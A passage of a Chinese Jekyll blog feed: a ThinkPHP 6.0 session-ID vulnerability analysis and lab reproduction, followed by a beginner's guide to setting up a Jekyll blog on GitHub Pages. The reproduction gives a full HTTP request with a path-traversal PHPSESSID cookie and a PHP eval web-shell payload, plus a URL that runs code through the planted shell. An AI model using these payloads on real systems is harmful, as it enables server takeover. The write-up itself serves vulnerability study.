    &lt;p&gt;官方信息：ThinkPHP 发布的补丁声称修复了一处由于不安全的 SessionId 导致的任意文件操作漏洞：在开启 Session 的情况下可以导致创建任意文件以及删除任意文件，特定情况下可以 getshell。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;根据这些信息，我们到官方 GitHub 的 commit 页面找一下相关的提交记录：&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200313_thinkphp6.0/thinkphpgit.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;在src/think/session/Store.php 中 212 行在设置 &lt;code class=&quot;highlighter-rouge&quot;&gt;id&lt;/code&gt; 时增加了一个函数：&lt;code class=&quot;highlighter-rouge&quot;&gt;ctype_alnum($text)&lt;/code&gt;，这个函数就是判断所有的字符全部是字母和(或者)数字，返回 TRUE 否则返回 FALSE，所以可能是存储 Session 时导致的文件写入&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;跟进找一下相关的函数&lt;/p&gt;

    &lt;p&gt;可以看到 &lt;code class=&quot;highlighter-rouge&quot;&gt;vendor/topthink/framework/src/think/session/Store.php:254&lt;/code&gt; 的 save()函数&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200313_thinkphp6.0/fenxi_1.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;263行write写入sessionId，265行delete删除sessionId，继续跟进write函数，在&lt;code class=&quot;highlighter-rouge&quot;&gt;vendor/topthink/framework/src/think/session/driver/File.php:210&lt;/code&gt;&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200313_thinkphp6.0/fenxi_2.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;从&lt;code class=&quot;highlighter-rouge&quot;&gt;$sessID&lt;/code&gt;来&lt;code class=&quot;highlighter-rouge&quot;&gt;getFileName&lt;/code&gt;，然后直接&lt;code class=&quot;highlighter-rouge&quot;&gt;writeFile&lt;/code&gt;写入，继续追踪&lt;code class=&quot;highlighter-rouge&quot;&gt;writeFile&lt;/code&gt;函数，还是在File.php下&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200313_thinkphp6.0/fenxi_3.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;可以看到调用了 &lt;code class=&quot;highlighter-rouge&quot;&gt;file_put_contents()&lt;/code&gt; 函数，这里是真正写入文件的操作了&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;file_put_contents($path, $content, LOCK_EX);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;

    &lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200313_thinkphp6.0/file_put_contents.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;如果文件名不存在，则创建文件，否则现有文件将被覆盖，除非设置了FILE_APPEND标志。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;分析：&lt;/p&gt;

    &lt;ul&gt;
      &lt;li&gt;
        &lt;p&gt;函数 &lt;code class=&quot;highlighter-rouge&quot;&gt;file_put_contents($path,$content,LOCK_EX)&lt;/code&gt; 中参数 &lt;code class=&quot;highlighter-rouge&quot;&gt;$path,$content&lt;/code&gt; 来源于函数 &lt;code class=&quot;highlighter-rouge&quot;&gt;writeFile($path,$data)&lt;/code&gt;&lt;/p&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;函数 &lt;code class=&quot;highlighter-rouge&quot;&gt;writeFile($path,$data)&lt;/code&gt; 中参数 &lt;code class=&quot;highlighter-rouge&quot;&gt;$path,$data&lt;/code&gt; 来源于函数 &lt;code class=&quot;highlighter-rouge&quot;&gt;write(String $sessionID,String $sessiData)&lt;/code&gt;&lt;/p&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;函数 &lt;code class=&quot;highlighter-rouge&quot;&gt;write(String $sessionID,String $sessiData)&lt;/code&gt; 中参数 &lt;code class=&quot;highlighter-rouge&quot;&gt;$sessionID,$sessiData&lt;/code&gt; 来源于 &lt;code class=&quot;highlighter-rouge&quot;&gt;save()&lt;/code&gt; 中调用了 &lt;code class=&quot;highlighter-rouge&quot;&gt;write()&lt;/code&gt;，同时传入的参数 &lt;code class=&quot;highlighter-rouge&quot;&gt;$sessionId&lt;/code&gt; 的值是调用 &lt;code class=&quot;highlighter-rouge&quot;&gt;getId()&lt;/code&gt; 传入的&lt;/p&gt;
      &lt;/li&gt;
    &lt;/ul&gt;

    &lt;p&gt;综上，文件名来源于 &lt;code class=&quot;highlighter-rouge&quot;&gt;$sessionId&lt;/code&gt;，当传入的 id 值长度为 32 ，创建 &lt;code class=&quot;highlighter-rouge&quot;&gt;sessionId&lt;/code&gt;，然后进行 &lt;code class=&quot;highlighter-rouge&quot;&gt;gitId()&lt;/code&gt;，就是这里判断不足&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200313_thinkphp6.0/session32.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;接下来找调用 &lt;code class=&quot;highlighter-rouge&quot;&gt;setId()&lt;/code&gt; 的地方&lt;code class=&quot;highlighter-rouge&quot;&gt;vendor/topthink/framework/src/think/middleware/SessionInit.php:46&lt;/code&gt;&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200313_thinkphp6.0/sessionid.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;其中 &lt;code class=&quot;highlighter-rouge&quot;&gt;cookieName&lt;/code&gt; 的值为 &lt;code class=&quot;highlighter-rouge&quot;&gt;PHPSESSID&lt;/code&gt;， &lt;code class=&quot;highlighter-rouge&quot;&gt;$sessionId&lt;/code&gt; 是 &lt;code class=&quot;highlighter-rouge&quot;&gt;cookie&lt;/code&gt; 中名为 &lt;code class=&quot;highlighter-rouge&quot;&gt;PHPSESSID&lt;/code&gt; 的值，因此是攻击者可控的，从而导致写入的文件名可控。&lt;/p&gt;

    &lt;p&gt;但是默认环境下，&lt;code class=&quot;highlighter-rouge&quot;&gt;session&lt;/code&gt; 的内容由 &lt;code class=&quot;highlighter-rouge&quot;&gt;vendor/topthink/framework/src/think/session/Store.php:261&lt;/code&gt; 的变量 &lt;code class=&quot;highlighter-rouge&quot;&gt;$data&lt;/code&gt; 传入：&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200313_thinkphp6.0/fenxi_4.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;$data&lt;/code&gt; 在默认环境中为空:&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200313_thinkphp6.0/fenxi_5.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;所以，可利用的条件比较苛刻&lt;/p&gt;

    &lt;p&gt;👹一是默认情况下是不开启session的，开启session才可以实现任意文件操作&lt;/p&gt;

    &lt;p&gt;👹二是写入的 session内容是由实际的后端业务逻辑来决定，只有特定情况才能getshell&lt;/p&gt;

    &lt;p&gt;那接下来就get一下shell吧&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;复现漏洞&quot;&gt;复现漏洞&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;修改&lt;code class=&quot;highlighter-rouge&quot;&gt;app/composer/Index.php&lt;/code&gt;，加一句&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;session('sueisok',&quot;1&quot;);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;

    &lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200313_thinkphp6.0/sueisok.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;开启session，去掉&lt;code class=&quot;highlighter-rouge&quot;&gt;app/middleware.php:9&lt;/code&gt;中的注释&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200313_thinkphp6.0/middleware.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;访问，抓包，将&lt;code class=&quot;highlighter-rouge&quot;&gt;PHPSESSID&lt;/code&gt;改为目录地址&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Cookie: PHPSESSID=../../../../public/sueisokkk.php
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;

    &lt;p&gt;💢坑：这里的&lt;code class=&quot;highlighter-rouge&quot;&gt;PHPSESSID&lt;/code&gt;一定要是32位的&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200313_thinkphp6.0/okkkphp.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;runtime/session/&lt;/code&gt;下会生成的session😀&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200313_thinkphp6.0/runtimesession.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;来恶意操作一下，把&lt;code class=&quot;highlighter-rouge&quot;&gt;app/composer/Index.php&lt;/code&gt;里写入&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;session('sueisok',$_GET[&quot;c&quot;]);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;

    &lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200313_thinkphp6.0/getc.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;访问，抓包，数据包内容&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;GET /index.php?s=index/index&amp;amp;c=%3C?php%20eval($_GET[a]);?%3E HTTP/1.1
Host: 172.16.70.244:8000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3835.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=../../../../public/sueisokkk.php
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;

    &lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200313_thinkphp6.0/eval.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;200之后，在&lt;code class=&quot;highlighter-rouge&quot;&gt;public/&lt;/code&gt;下写入了名为&lt;code class=&quot;highlighter-rouge&quot;&gt;sueisokkk.php&lt;/code&gt;的文件，在浏览器中访问构造带有payload的链接：&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://xxx.xxx.xxx.xxx:8000/sueisokkk.php?a=fwrite(fopen(%22aa.txt%22,%20%22w%22),%22hello,world!%22);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;

    &lt;p&gt;就在&lt;code class=&quot;highlighter-rouge&quot;&gt;public/&lt;/code&gt;下写入了名为&lt;code class=&quot;highlighter-rouge&quot;&gt;aa.txt&lt;/code&gt;内容为&lt;code class=&quot;highlighter-rouge&quot;&gt;hello,world&lt;/code&gt;的文件&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200313_thinkphp6.0/helloworld.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;😇此时的心情彷佛春天来到&lt;/p&gt;

&lt;h1 id=&quot;其他的坑&quot;&gt;其他的坑&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;💢如果修改了session以后，http://localhost:8000访问之后出错，就要试一下&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ sudo php think run
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;💢如果&lt;code class=&quot;highlighter-rouge&quot;&gt;runtime/session/&lt;/code&gt;下没有生成的session，那就应该是文件夹写的权限不够，我是直接给了777&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ sudo chmod 777 /runtime/session/
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;所以能任意写入文件getshell的条件还是很苛刻的&lt;/p&gt;</content><author><name>true</name></author><category term="ThinkPHP" /><category term="漏洞复现" /><summary type="html"></summary></entry><entry><title type="html">第一篇博客</title><link href="http://localhost:4000/blog/first-blog/" rel="alternate" type="text/html" title="第一篇博客" /><published>2020-01-15T15:04:21+08:00</published><updated>2020-01-15T15:04:21+08:00</updated><id>http://localhost:4000/blog/first-blog</id><content type="html" xml:base="http://localhost:4000/blog/first-blog/">&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#0x00-拥有github&quot; id=&quot;markdown-toc-0x00-拥有github&quot;&gt;0x00 拥有github&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#0x01-选择的工具&quot; id=&quot;markdown-toc-0x01-选择的工具&quot;&gt;0x01 选择的工具&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#0x02-安装工具&quot; id=&quot;markdown-toc-0x02-安装工具&quot;&gt;0x02 安装工具&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#安装ruby&quot; id=&quot;markdown-toc-安装ruby&quot;&gt;安装ruby&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#安装bundle&quot; id=&quot;markdown-toc-安装bundle&quot;&gt;安装bundle&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#安装jekyll&quot; id=&quot;markdown-toc-安装jekyll&quot;&gt;安装jekyll&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#注册来必力&quot; id=&quot;markdown-toc-注册来必力&quot;&gt;注册来必力&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#0x03-发表自己的第一篇博客&quot; id=&quot;markdown-toc-0x03-发表自己的第一篇博客&quot;&gt;0x03 发表自己的第一篇博客&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#把自己原先的仓库clone下来&quot; id=&quot;markdown-toc-把自己原先的仓库clone下来&quot;&gt;把自己原先的仓库clone下来&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#选择一个自己喜欢的主题&quot; id=&quot;markdown-toc-选择一个自己喜欢的主题&quot;&gt;选择一个自己喜欢的主题&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#用typora写一篇内容&quot; id=&quot;markdown-toc-用typora写一篇内容&quot;&gt;用Typora写一篇内容&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#将修改内容提交到github&quot; id=&quot;markdown-toc-将修改内容提交到github&quot;&gt;将修改内容提交到github&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;0x00-拥有github&quot;&gt;0x00 拥有github&lt;/h1&gt;
&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;为什么用github：
(￣▽￣)”方便不要钱，没有别的&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;注册github账号：&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;这个不用说了，之前就有账号了，直接在仓库里新建就行，会有个域名，比如我的是&lt;code class=&quot;highlighter-rouge&quot;&gt;sueisok&lt;/code&gt;，域名就是&lt;code class=&quot;highlighter-rouge&quot;&gt;sueisok.github.io&lt;/code&gt;了。不需要什么dnspod，什么dnsdaddy，什么一年50美元租服务器，贵且不好维护，且第三方平台比如wordpress可能有漏洞之类的，还要时常更新版本&lt;/p&gt;

&lt;h1 id=&quot;0x01-选择的工具&quot;&gt;0x01 选择的工具&lt;/h1&gt;

&lt;p&gt;本人电脑为win10系统&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://rubyinstaller.org/downloads/&quot;&gt;Ruby&lt;/a&gt;:一种简单快捷的面向对象（面向对象程序设计）脚本语言，安装Jekyll需要电脑上安装Ruby&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://jekyllcn.com/&quot;&gt;Jekyll&lt;/a&gt;：jekyll生成Git Pages，是一个生成静态网页的工具，不需要数据库支持。但是可以配合第三方服务，比如评论区可以有第三方支持，我这里用的是来必力&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://typora.io/&quot;&gt;Typora&lt;/a&gt;:是一款支持实时预览的 Markdown 文本编辑器，很强大&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://livere.com/&quot;&gt;来必力&lt;/a&gt;:添加的第三方评论工具&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;0x02-安装工具&quot;&gt;0x02 安装工具&lt;/h1&gt;

&lt;h2 id=&quot;安装ruby&quot;&gt;安装ruby&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;a href=&quot;https://rubyinstaller.org/downloads/&quot;&gt;Ruby官网&lt;/a&gt;下载安装包，选择带DevKit的&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;安装到某个路径下即可&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;添加到环境变量&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;检查ruby是否安装成功：&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ ruby -v
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;ul&gt;
  &lt;li&gt;检查gem版本，gem是一个管理ruby库和程序的标准包，用RubyInstaller安装ruby之后都附带有gem（不是邓紫棋&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ gem -v
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h2 id=&quot;安装bundle&quot;&gt;安装bundle&lt;/h2&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ gem install bundle
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;至于这是什么，我不知道，至于会出现什么报错，我没遇见&lt;/p&gt;

&lt;h2 id=&quot;安装jekyll&quot;&gt;安装jekyll&lt;/h2&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ gem install jekyll
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;成功的话就成功了。这里碎碎念一下，(ノへ￣、)公司电脑上就可以安装成功，家里自己的电脑就不成功&lt;/p&gt;

&lt;p&gt;查看jekyll版本&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ jekyll -v
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;如果报错啥的，就按他提示，有可能是&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ bundle exec jekyll -v
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;显示了版本就是成功袅 我的是jekyll 3.8.6&lt;/p&gt;

&lt;h2 id=&quot;注册来必力&quot;&gt;注册来必力&lt;/h2&gt;

&lt;p&gt;注册完将生成的内容添加到仓库文件的&lt;code class=&quot;highlighter-rouge&quot;&gt;_config.yml&lt;/code&gt;里&lt;/p&gt;

&lt;h1 id=&quot;0x03-发表自己的第一篇博客&quot;&gt;0x03 发表自己的第一篇博客&lt;/h1&gt;

&lt;p&gt;我自己之前在github上有过主页，所以我这里只写如何应用一个自己喜欢的主题，然后提交到git上，让所有人都看到&lt;/p&gt;

&lt;h2 id=&quot;把自己原先的仓库clone下来&quot;&gt;把自己原先的仓库clone下来&lt;/h2&gt;

&lt;p&gt;原先github上有过主页，clone到本地一个路径下&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ git clone xxx你的仓库xxx
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;选择一个自己喜欢的主题&quot;&gt;选择一个自己喜欢的主题&lt;/h2&gt;

&lt;p&gt;有好多主题的网站，我这个是在&lt;a href=&quot;http://jekyllthemes.org/&quot;&gt;jekyllthemes&lt;/a&gt;找的，也可以在喜欢的博主页脚中找到他们用的主题（真是个小机灵鬼儿&lt;/p&gt;

&lt;p&gt;下载下来，如果这个主题能用的话，接着往下进行&lt;/p&gt;

&lt;p&gt;如果直接把主题中的内容复制到仓库里，会出错，这里建议先在主题的目录下生成页面，再复制到clone的仓库目录下，在下载的主题目录下：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ bundle exec jekyll serve
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;然后将生成的所有内容复制到自己目录下&lt;/p&gt;

&lt;p&gt;如果之前仓库有自己的内容，比如&lt;code class=&quot;highlighter-rouge&quot;&gt;_posts&lt;/code&gt;里的静态页面或者&lt;code class=&quot;highlighter-rouge&quot;&gt;_config.yml&lt;/code&gt;的内容，需要修改后再替换&lt;/p&gt;

&lt;p&gt;在自己的仓库目录下：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ bundle exec jekyll serve
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;显示&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Configuration file: xxxx/sueisok.github.io/_config.yml
            Source: xxxx/sueisok.github.io
       Destination: xxxx/sueisok.github.io/_site
 Incremental build: disabled. Enable with --incremental
      Generating...
       Jekyll Feed: Generating feed for posts
                    done in 2.183 seconds.
 Auto-regeneration: enabled for 'xxxx/sueisok.github.io'
  JekyllAdmin mode: production
    Server address: http://127.0.0.1:4000
  Server running... press ctrl-c to stop.
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;即可访问本地&lt;code class=&quot;highlighter-rouge&quot;&gt;http://127.0.0.1:4000&lt;/code&gt;查看页面，直到自己满意了之后再提交到github上&lt;/p&gt;

&lt;h2 id=&quot;用typora写一篇内容&quot;&gt;用Typora写一篇内容&lt;/h2&gt;

&lt;p&gt;Typora是可以写markdown格式内容的编辑器，简约大方又不失便捷，还可以直接添加emoji表情，下次试一下&lt;/p&gt;

&lt;p&gt;写完直接丢到仓库的&lt;code class=&quot;highlighter-rouge&quot;&gt;_posts&lt;/code&gt;里面&lt;/p&gt;

&lt;h2 id=&quot;将修改内容提交到github&quot;&gt;将修改内容提交到github&lt;/h2&gt;

&lt;p&gt;可以下载&lt;a href=&quot;https://desktop.github.com/&quot;&gt;GitHub Desktop&lt;/a&gt;，比较直观&lt;/p&gt;

&lt;p&gt;也可以手动提交到git，我这里目前只有一个master分支，操作也比较暴力因为只有我一个人维护，如果需要其他分支可自行百度&lt;/p&gt;

&lt;p&gt;查看修改内容：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ git status
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;将要提交的文件的信息添加到索引库&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ git add .
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;添加此次修改的备注&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ git commit -m &quot;xxxx&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;提交到master分支&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ git push origin master
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;网络差的话可能提交失败，再试一下就好了（〃｀ 3′〃）&lt;/p&gt;

&lt;p&gt;然后稍等一下就可以看到自己的commit成功，在等一下就可以看到自己的文章更新好了，奥里给！&lt;/p&gt;</content><author><name>true</name></author><category term="jekyll" /><category term="github" /><summary type="html"></summary></entry></feed>